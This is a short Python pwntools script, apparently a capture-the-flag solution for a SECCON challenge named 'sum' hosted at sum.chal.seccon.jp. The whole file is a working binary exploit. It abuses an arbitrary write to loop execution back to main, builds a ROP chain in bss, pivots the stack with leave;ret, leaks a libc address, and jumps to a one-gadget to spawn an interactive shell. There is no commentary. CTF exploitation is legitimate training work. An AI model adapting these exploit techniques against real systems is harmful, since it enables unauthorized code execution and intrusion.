from pwn import *

#p = process("./sum")
p = remote("sum.chal.seccon.jp",10001)

prdiret = 0x0000000000400a43 
leaveret = 0x0000000004009DD
prbp = 0x00000000004006d8
prsir15 = 0x0000000000400a41

p.recvuntil("e]")

bss = 0x601900

#exit -> main
p.sendline(str(-0x601048))
p.sendline("1")
p.sendline("2")
p.sendline("3")
p.sendline(str(0x400903-6))
p.sendline(str(0x601048))

ROP = [prdiret,0x0000000000601018,0x0000000000400600,prdiret,0x0000000000400A68,prsir15,0x601048,0,0x0000000000400650,0x0000000000400660]

for i in range(len(ROP)) : 
	print i
	p.sendline(str(-(bss+8*i)))
	p.sendline("1")
	p.sendline("2")
	p.sendline("3")
	p.sendline(str(ROP[i]-6))
	p.sendline(str(bss+8*i))

p.sendline(str(prbp))
p.sendline(str(bss-8))
p.sendline(str(leaveret))
p.sendline(str(1))
p.sendline(str(-prbp-(bss-8)-leaveret-1-0x601048+prdiret))
p.sendline(str(0x601048))

libc = u64(p.recvuntil("\x7f")[-6:]+"\x00\x00") - 0x809c0

print hex(libc)

p.sendline(str(libc+0x10a38c))

p.interactive()
